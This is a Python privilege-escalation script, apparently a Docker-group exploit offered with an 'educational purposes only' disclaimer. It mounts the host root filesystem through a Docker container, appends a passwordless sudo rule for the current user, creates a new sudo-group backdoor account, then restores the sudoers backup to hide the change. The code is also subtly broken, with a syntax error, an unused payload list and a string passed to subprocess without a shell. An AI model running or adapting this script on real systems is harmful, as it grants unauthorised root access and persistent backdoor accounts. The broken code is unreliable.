import subprocess
import argparse
import sys

# This script was intended for ethical and educational purposes only.
# The author does not promote or endorse any illegal use of this tool and is not responsible for any misuse or any damages caused by it.

def main():

    parser = argparse.ArgumentParser(description="DockerPE")

    parser.add_argument("--user")
    parser.add_argument("--newuser")
    parser.add_argument("--newpass")

    args = parser.parse_args()

    Kuser = args.user
    Nuser = args.newuser
    NuserPasswd = args.newpass

    if not Kuser:
        Kuser = input("Current user: ")

    if not Nuser:
        Nuser = input("New user: ")

    if not NuserPasswd:
        NuserPasswd = input("New password: ")

    # Create password hash
    tmpHash = subprocess.run(
    ["openssl", "passwd", "-6", NuserPasswd],
    capture_output=True,
    text=True
    check=True
    )
    HashedNuserPasswd = tmpHash.stdout.strip()

    # Payload generation
    payload = ["docker", "run", "--rm", "-i", "-v", "/:/mnt", "alpine", "chroot", "/mnt", "/bin/sh", "-c", f"cp /etc/sudoers /etc/sudoers.tmp && echo '{Kuser} ALL=(ALL) NOPASSWD: ALL' >> sudoers", ]
    
    # Privilege escalation
    subprocess.run(f'''docker run --rm -i -v /:/mnt alpine chroot /mnt /bin/sh -c 'cd /etc && cp ./sudoers ./sudoers.tmp && echo "{Kuser} ALL=(ALL) NOPASSWD: ALL" >> sudoers' ''')

    subprocess.run(["sudo", "useradd", "-m", Nuser], check=True)
    subprocess.run(["sudo", "usermod", "-p", HashedNuserPasswd, Nuser])
    subprocess.run(["sudo", "usermod", "-aG", "sudo", Nuser])

    subprocess.run(["mv", "/etc/sudoers.tmp", "/etc/sudoers"])
    sys.exit(0)

if __name__ == "__main__":
    main()
